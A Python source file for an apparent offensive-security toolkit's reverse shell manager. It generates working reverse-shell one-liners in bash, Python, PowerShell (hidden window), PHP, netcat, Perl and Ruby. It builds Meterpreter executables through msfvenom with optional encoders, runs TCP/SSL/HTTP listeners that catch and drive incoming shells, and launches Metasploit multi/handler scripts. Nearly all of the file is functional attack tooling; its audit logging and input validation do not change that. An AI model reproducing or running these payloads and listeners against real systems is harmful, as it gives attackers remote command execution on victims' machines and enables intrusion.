"""
Reverse Shell Manager - multi-listener, multi-protocol handler suite.

Spawns concurrent listeners (raw TCP, SSL/TLS, HTTP-beacon) on operator-chosen
ports. Each incoming connection becomes a tracked Session whose I/O is mirrored
to the audit log and to a per-session transcript file under logs/.

Hard rules (non-negotiable):
- No shell=True anywhere.
- Every LHOST/LPORT is validated through SecureInputValidator.
- All external tool paths resolved via shutil.which().
- Every lifecycle event is sent through core.audit.audit().
- Transcript files and generated artifacts are created with mode 0o600.
"""

from __future__ import annotations

import datetime
import os
import shutil
import socket
import ssl
import subprocess
import threading
import uuid
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional

from core.audit import audit
from core.validators import SecureInputValidator
from config.settings import (
    LOGS_DIR,
    EXPORTS_DIR,
    SENSITIVE_FILE_PERMS,
    SENSITIVE_DIR_PERMS,
)


PROTO_TCP = "tcp"
PROTO_SSL = "ssl"
PROTO_HTTP = "http"

SUPPORTED_PROTOCOLS = (PROTO_TCP, PROTO_SSL, PROTO_HTTP)


class PayloadGenerator:
    """Generate reverse-shell one-liners. Pure-string output - no execution here."""

    SUPPORTED_TYPES = (
        "bash", "bash_tcp", "python", "python3", "powershell", "pwsh",
        "php", "nc", "ncat", "perl", "ruby",
    )

    @staticmethod
    def _validate(lhost: str, lport) -> tuple[str, int]:
        host = SecureInputValidator.validate_host(lhost)
        port = SecureInputValidator.validate_port(lport)
        return host, port

    @classmethod
    def bash(cls, lhost: str, lport) -> str:
        host, port = cls._validate(lhost, lport)
        return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"

    @classmethod
    def bash_tcp(cls, lhost: str, lport) -> str:
        host, port = cls._validate(lhost, lport)
        return (
            f"/bin/bash -c 'sh -i 5<> /dev/tcp/{host}/{port};"
            f" cat <&5 | while read line; do $line 2>&5 >&5; done'"
        )

    @classmethod
    def python(cls, lhost: str, lport) -> str:
        host, port = cls._validate(lhost, lport)
        return (
            "python3 -c 'import socket,subprocess,os,pty;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "pty.spawn(\"/bin/bash\")'"
        )

    @classmethod
    def powershell(cls, lhost: str, lport) -> str:
        host, port = cls._validate(lhost, lport)
        return (
            "powershell -NoP -NonI -W Hidden -Command \""
            f"$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});"
            "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
            "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1 | Out-String);"
            "$rb=([text.encoding]::ASCII).GetBytes($r);"
            "$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()\""
        )

    @classmethod
    def php(cls, lhost: str, lport) -> str:
        host, port = cls._validate(lhost, lport)
        return (
            f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'\"); ?>"
        )

    @classmethod
    def nc(cls, lhost: str, lport) -> str:
        host, port = cls._validate(lhost, lport)
        return f"nc -e /bin/sh {host} {port}"

    @classmethod
    def ncat(cls, lhost: str, lport) -> str:
        host, port = cls._validate(lhost, lport)
        return (
            f"rm /tmp/.f;mkfifo /tmp/.f;cat /tmp/.f | /bin/sh -i 2>&1 | "
            f"nc {host} {port} > /tmp/.f"
        )

    @classmethod
    def perl(cls, lhost: str, lport) -> str:
        host, port = cls._validate(lhost, lport)
        return (
            f"perl -e 'use Socket;$i=\"{host}\";$p={port};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
            "open(STDIN,\">&S\");open(STDOUT,\">&S\");"
            "open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
        )

    @classmethod
    def ruby(cls, lhost: str, lport) -> str:
        host, port = cls._validate(lhost, lport)
        return (
            f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{host}\",\"{port}\");"
            "while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
        )

    @classmethod
    def generate(cls, payload_type: str, lhost: str, lport) -> str:
        payload_type = (payload_type or "").lower().strip()
        if payload_type not in cls.SUPPORTED_TYPES:
            raise ValueError(
                f"Unknown payload type: {payload_type!r}. "
                f"Supported: {cls.SUPPORTED_TYPES}"
            )
        method_name = "python" if payload_type in ("python", "python3") else payload_type
        method_name = "powershell" if payload_type == "pwsh" else method_name
        fn = getattr(cls, method_name)
        result = fn(lhost, lport)
        audit(
            action="payload.generate",
            host=lhost,
            detail=f"type={payload_type} lport={lport}",
        )
        return result


class MsfvenomWrapper:
    """Wrap msfvenom. No shell=True, no string interpolation."""

    DEFAULT_PAYLOADS = {
        "windows_exe": "windows/x64/meterpreter/reverse_tcp",
        "linux_elf": "linux/x64/meterpreter/reverse_tcp",
        "windows_x86_exe": "windows/meterpreter/reverse_tcp",
    }
    DEFAULT_FORMATS = {
        "windows_exe": "exe",
        "linux_elf": "elf",
        "windows_x86_exe": "exe",
    }
    DEFAULT_EXTENSION = {
        "windows_exe": ".exe",
        "linux_elf": ".elf",
        "windows_x86_exe": ".exe",
    }

    @staticmethod
    def _which() -> str:
        path = shutil.which("msfvenom")
        if not path:
            raise FileNotFoundError("msfvenom not found in PATH")
        return path

    @classmethod
    def generate(
        cls,
        target_kind: str,
        lhost: str,
        lport,
        out_name: Optional[str] = None,
        encoder: Optional[str] = None,
        iterations: int = 0,
        dry_run: bool = False,
    ) -> tuple[List[str], Optional[str]]:
        if target_kind not in cls.DEFAULT_PAYLOADS:
            raise ValueError(
                f"Unsupported target kind: {target_kind!r}. "
                f"Choose from: {list(cls.DEFAULT_PAYLOADS)}"
            )
        host = SecureInputValidator.validate_host(lhost)
        port = SecureInputValidator.validate_port(lport)

        ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        safe_name = SecureInputValidator.safe_filename_fragment(
            out_name or f"payload_{target_kind}_{ts}"
        )
        fmt = cls.DEFAULT_FORMATS[target_kind]
        ext = cls.DEFAULT_EXTENSION[target_kind]
        out_path = os.path.join(EXPORTS_DIR, safe_name + ext)
        payload = cls.DEFAULT_PAYLOADS[target_kind]

        argv = [
            cls._which(),
            "-p", payload,
            f"LHOST={host}",
            f"LPORT={port}",
            "-f", fmt,
            "-o", out_path,
        ]
        if encoder:
            if not all(c.isalnum() or c in "_/-." for c in encoder):
                raise ValueError(f"Unsafe encoder name: {encoder!r}")
            argv += ["-e", encoder, "-i", str(int(iterations))]

        audit(
            action="msfvenom.generate",
            host=host,
            detail=(
                f"target={target_kind} payload={payload} lport={port} "
                f"out={out_path} dry_run={dry_run}"
            ),
        )

        if dry_run:
            return argv, None

        try:
            proc = subprocess.run(
                argv,
                check=False,
                capture_output=True,
                timeout=120,
            )
            if proc.returncode != 0:
                raise RuntimeError(
                    f"msfvenom failed (rc={proc.returncode}): "
                    f"{proc.stderr.decode(errors='replace')[:512]}"
                )
            if os.path.exists(out_path):
                try:
                    os.chmod(out_path, SENSITIVE_FILE_PERMS)
                except OSError:
                    pass
            return argv, out_path
        except subprocess.TimeoutExpired as exc:
            raise RuntimeError("msfvenom timed out after 120s") from exc


def generate_self_signed_cert(common_name: str = "Termite-sumu-RS") -> tuple[str, str]:
    """Generate a self-signed ECDSA cert+key into logs/ with mode 0o600."""
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import ec
    except ImportError as exc:
        raise RuntimeError("cryptography library is required for SSL listener") from exc

    safe_cn = SecureInputValidator.safe_filename_fragment(common_name)
    ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    cert_dir = os.path.join(LOGS_DIR, f"rs_certs_{ts}")
    os.makedirs(cert_dir, mode=SENSITIVE_DIR_PERMS, exist_ok=True)
    try:
        os.chmod(cert_dir, SENSITIVE_DIR_PERMS)
    except OSError:
        pass

    key = ec.generate_private_key(ec.SECP384R1())
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, safe_cn),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Termite-sumu"),
    ])
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.utcnow() - datetime.timedelta(minutes=5))
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=30))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .sign(key, hashes.SHA384())
    )

    cert_path = os.path.join(cert_dir, "listener.crt")
    key_path = os.path.join(cert_dir, "listener.key")
    cert_bytes = cert.public_bytes(serialization.Encoding.PEM)
    key_bytes = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )

    fd = os.open(cert_path, os.O_CREAT | os.O_WRONLY | os.O_TRUNC, SENSITIVE_FILE_PERMS)
    try:
        os.write(fd, cert_bytes)
    finally:
        os.close(fd)
    fd = os.open(key_path, os.O_CREAT | os.O_WRONLY | os.O_TRUNC, SENSITIVE_FILE_PERMS)
    try:
        os.write(fd, key_bytes)
    finally:
        os.close(fd)

    audit(action="rs.cert.generated", detail=f"cn={safe_cn} dir={cert_dir}")
    return cert_path, key_path


@dataclass
class Session:
    """A single accepted reverse-shell connection."""
    sid: str
    sock: socket.socket
    peer_ip: str
    peer_port: int
    listener_id: str
    protocol: str
    started_at: datetime.datetime = field(
        default_factory=lambda: datetime.datetime.now(datetime.timezone.utc)
    )
    alive: bool = True
    os_hint: str = "unknown"
    transcript_path: str = ""
    _read_thread: Optional[threading.Thread] = None
    _on_output: Optional[Callable[[str], None]] = None
    _on_closed: Optional[Callable[[], None]] = None
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def __post_init__(self):
        ts = self.started_at.strftime("%Y%m%d_%H%M%S")
        safe_peer = SecureInputValidator.safe_filename_fragment(
            f"{self.peer_ip}_{self.peer_port}"
        )
        fname = f"rs_session_{ts}_{safe_peer}_{self.sid[:8]}.log"
        self.transcript_path = os.path.join(LOGS_DIR, fname)
        fd = os.open(
            self.transcript_path,
            os.O_CREAT | os.O_WRONLY | os.O_APPEND,
            SENSITIVE_FILE_PERMS,
        )
        os.close(fd)
        try:
            os.chmod(self.transcript_path, SENSITIVE_FILE_PERMS)
        except OSError:
            pass

    def _append_transcript(self, direction: str, data: bytes) -> None:
        try:
            stamp = datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds")
            header = f"\n--- [{stamp}] {direction} ({len(data)} bytes) ---\n"
            with self._lock:
                fd = os.open(
                    self.transcript_path,
                    os.O_WRONLY | os.O_APPEND | os.O_CREAT,
                    SENSITIVE_FILE_PERMS,
                )
                try:
                    os.write(fd, header.encode("utf-8"))
                    os.write(fd, data)
                finally:
                    os.close(fd)
        except OSError:
            pass

    def start_reader(
        self,
        on_output: Callable[[str], None],
        on_closed: Callable[[], None],
    ) -> None:
        self._on_output = on_output
        self._on_closed = on_closed
        t = threading.Thread(
            target=self._reader_loop,
            name=f"rs-rd-{self.sid[:8]}",
            daemon=True,
        )
        self._read_thread = t
        t.start()

    def attach_output(self, on_output: Callable[[str], None]) -> None:
        """Replace the output callback (used by GUI to attach a session terminal)."""
        self._on_output = on_output

    def _reader_loop(self) -> None:
        try:
            self.sock.settimeout(0.5)
        except OSError:
            pass
        try:
            while self.alive:
                try:
                    data = self.sock.recv(4096)
                except socket.timeout:
                    continue
                except (OSError, ssl.SSLError):
                    break
                if not data:
                    break
                self._append_transcript("RECV", data)
                if self._on_output:
                    try:
                        self._on_output(data.decode(errors="replace"))
                    except Exception:
                        pass
        finally:
            self.alive = False
            try:
                self.sock.close()
            except OSError:
                pass
            audit(
                action="rs.session.closed",
                host=self.peer_ip,
                detail=f"sid={self.sid} listener={self.listener_id} proto={self.protocol}",
            )
            if self._on_closed:
                try:
                    self._on_closed()
                except Exception:
                    pass

    def send(self, data: str) -> bool:
        if not self.alive:
            return False
        if not data.endswith("\n"):
            data = data + "\n"
        payload = data.encode("utf-8", errors="replace")
        try:
            self.sock.sendall(payload)
        except (OSError, ssl.SSLError) as exc:
            audit(
                action="rs.session.send_fail",
                host=self.peer_ip,
                detail=f"sid={self.sid} err={exc!r}",
            )
            self.alive = False
            return False
        self._append_transcript("SENT", payload)
        audit(
            action="rs.session.send",
            host=self.peer_ip,
            detail=f"sid={self.sid} bytes={len(payload)}",
        )
        return True

    def close(self) -> None:
        self.alive = False
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            self.sock.close()
        except OSError:
            pass


@dataclass
class Listener:
    lid: str
    protocol: str
    lhost: str
    lport: int
    server_sock: Optional[socket.socket] = None
    ssl_context: Optional[ssl.SSLContext] = None
    accept_thread: Optional[threading.Thread] = None
    alive: bool = False
    cert_path: str = ""
    key_path: str = ""
    started_at: Optional[datetime.datetime] = None


class ReverseShellManager:
    """Multi-listener, multi-session orchestrator."""

    def __init__(self) -> None:
        self._listeners: Dict[str, Listener] = {}
        self._sessions: Dict[str, Session] = {}
        self._lock = threading.Lock()
        self._on_session_started: Optional[Callable[[Session], None]] = None
        self._on_session_ended: Optional[Callable[[str], None]] = None
        self._on_listener_state: Optional[Callable[[str, str], None]] = None

    def set_callbacks(
        self,
        on_session_started: Optional[Callable[[Session], None]] = None,
        on_session_ended: Optional[Callable[[str], None]] = None,
        on_listener_state: Optional[Callable[[str, str], None]] = None,
    ) -> None:
        self._on_session_started = on_session_started
        self._on_session_ended = on_session_ended
        self._on_listener_state = on_listener_state

    def start_listener(self, protocol: str, lhost: str, lport) -> str:
        protocol = (protocol or "").lower().strip()
        if protocol not in SUPPORTED_PROTOCOLS:
            raise ValueError(
                f"Unsupported protocol: {protocol!r}. "
                f"Choose from: {SUPPORTED_PROTOCOLS}"
            )
        host = SecureInputValidator.validate_host(lhost)
        port = SecureInputValidator.validate_port(lport)

        lid = uuid.uuid4().hex
        listener = Listener(
            lid=lid,
            protocol=protocol,
            lhost=host,
            lport=port,
            started_at=datetime.datetime.now(datetime.timezone.utc),
        )

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind((host, port))
            srv.listen(8)
        except OSError as exc:
            srv.close()
            audit(
                action="rs.listener.bind_fail",
                host=host,
                detail=f"port={port} proto={protocol} err={exc!r}",
            )
            raise RuntimeError(f"bind {host}:{port} failed: {exc}") from exc
        listener.server_sock = srv

        if protocol == PROTO_SSL:
            cert_path, key_path = generate_self_signed_cert(
                common_name=f"rs-{host}-{port}",
            )
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(certfile=cert_path, keyfile=key_path)
            try:
                ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            except (AttributeError, ValueError):
                pass
            listener.ssl_context = ctx
            listener.cert_path = cert_path
            listener.key_path = key_path

        listener.alive = True
        with self._lock:
            self._listeners[lid] = listener

        t = threading.Thread(
            target=self._accept_loop,
            args=(lid,),
            name=f"rs-acc-{lid[:8]}",
            daemon=True,
        )
        listener.accept_thread = t
        t.start()

        audit(
            action="rs.listener.start",
            host=host,
            detail=f"lid={lid} port={port} proto={protocol}",
        )
        if self._on_listener_state:
            try:
                self._on_listener_state(lid, "started")
            except Exception:
                pass
        return lid

    def stop_listener(self, lid: str) -> bool:
        with self._lock:
            listener = self._listeners.get(lid)
        if not listener:
            return False
        listener.alive = False
        try:
            if listener.server_sock:
                listener.server_sock.close()
        except OSError:
            pass
        audit(
            action="rs.listener.stop",
            host=listener.lhost,
            detail=f"lid={lid} port={listener.lport}",
        )
        if self._on_listener_state:
            try:
                self._on_listener_state(lid, "stopped")
            except Exception:
                pass
        return True

    def list_listeners(self) -> List[Listener]:
        with self._lock:
            return list(self._listeners.values())

    def _accept_loop(self, lid: str) -> None:
        listener = self._listeners.get(lid)
        if not listener or not listener.server_sock:
            return
        srv = listener.server_sock
        srv.settimeout(1.0)
        while listener.alive:
            try:
                sock, addr = srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break

            peer_ip, peer_port = addr[0], addr[1]
            try:
                if listener.protocol == PROTO_SSL and listener.ssl_context:
                    sock = listener.ssl_context.wrap_socket(sock, server_side=True)
                elif listener.protocol == PROTO_HTTP:
                    try:
                        sock.settimeout(2.0)
                        sock.recv(4096)
                        sock.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
                        sock.settimeout(None)
                    except OSError:
                        pass

                sid = uuid.uuid4().hex
                session = Session(
                    sid=sid,
                    sock=sock,
                    peer_ip=peer_ip,
                    peer_port=peer_port,
                    listener_id=lid,
                    protocol=listener.protocol,
                )
                with self._lock:
                    self._sessions[sid] = session

                audit(
                    action="rs.session.open",
                    host=peer_ip,
                    detail=(
                        f"sid={sid} listener={lid} "
                        f"proto={listener.protocol} src_port={peer_port}"
                    ),
                )

                def _on_closed(s=sid):
                    self._cleanup_session(s)

                def _no_output(_text):
                    pass

                session.start_reader(on_output=_no_output, on_closed=_on_closed)
                if self._on_session_started:
                    try:
                        self._on_session_started(session)
                    except Exception:
                        pass
            except (ssl.SSLError, OSError) as exc:
                try:
                    sock.close()
                except OSError:
                    pass
                audit(
                    action="rs.session.accept_fail",
                    host=peer_ip,
                    detail=f"listener={lid} err={exc!r}",
                )

    def _cleanup_session(self, sid: str) -> None:
        with self._lock:
            self._sessions.pop(sid, None)
        if self._on_session_ended:
            try:
                self._on_session_ended(sid)
            except Exception:
                pass

    def get_session(self, sid: str) -> Optional[Session]:
        with self._lock:
            return self._sessions.get(sid)

    def list_sessions(self) -> List[Session]:
        with self._lock:
            return list(self._sessions.values())

    def kill_session(self, sid: str) -> bool:
        with self._lock:
            session = self._sessions.get(sid)
        if not session:
            return False
        session.close()
        return True

    def shutdown(self) -> None:
        for lid in list(self._listeners.keys()):
            self.stop_listener(lid)
        with self._lock:
            sessions = list(self._sessions.values())
        for s in sessions:
            s.close()


class MsfMultiHandlerLauncher:
    """Build and execute an msfconsole resource script for a multi/handler."""

    SUPPORTED_PAYLOADS = (
        "windows/x64/meterpreter/reverse_tcp",
        "windows/meterpreter/reverse_tcp",
        "linux/x64/meterpreter/reverse_tcp",
        "linux/x86/meterpreter/reverse_tcp",
        "python/meterpreter/reverse_tcp",
        "php/meterpreter/reverse_tcp",
        "windows/x64/meterpreter/reverse_https",
    )

    @staticmethod
    def _which() -> str:
        path = shutil.which("msfconsole")
        if not path:
            raise FileNotFoundError("msfconsole not found in PATH")
        return path

    @classmethod
    def build_resource(
        cls,
        payload: str,
        lhost: str,
        lport,
        exit_on_session: bool = False,
    ) -> str:
        if payload not in cls.SUPPORTED_PAYLOADS:
            raise ValueError(
                f"Unsupported MSF payload: {payload!r}. "
                f"Supported: {cls.SUPPORTED_PAYLOADS}"
            )
        host = SecureInputValidator.validate_host(lhost)
        port = SecureInputValidator.validate_port(lport)

        ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        rc_path = os.path.join(LOGS_DIR, f"msf_handler_{ts}.rc")
        body = (
            "use exploit/multi/handler\n"
            f"set PAYLOAD {payload}\n"
            f"set LHOST {host}\n"
            f"set LPORT {port}\n"
            "set ExitOnSession " + ("true" if exit_on_session else "false") + "\n"
            "set EnableStageEncoding true\n"
            "exploit -j -z\n"
        )
        fd = os.open(rc_path, os.O_CREAT | os.O_WRONLY | os.O_TRUNC, SENSITIVE_FILE_PERMS)
        try:
            os.write(fd, body.encode("utf-8"))
        finally:
            os.close(fd)
        try:
            os.chmod(rc_path, SENSITIVE_FILE_PERMS)
        except OSError:
            pass
        audit(
            action="msf.handler.rc_written",
            host=host,
            detail=f"path={rc_path} payload={payload} lport={port}",
        )
        return rc_path

    @classmethod
    def launch(
        cls,
        payload: str,
        lhost: str,
        lport,
        dry_run: bool = False,
    ) -> tuple[List[str], Optional[subprocess.Popen]]:
        rc_path = cls.build_resource(payload, lhost, lport)
        argv = [cls._which(), "-q", "-r", rc_path]
        audit(
            action="msf.handler.launch",
            host=lhost,
            detail=f"rc={rc_path} dry_run={dry_run}",
        )
        if dry_run:
            return argv, None
        proc = subprocess.Popen(
            argv,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=1,
            text=True,
        )
        return argv, proc
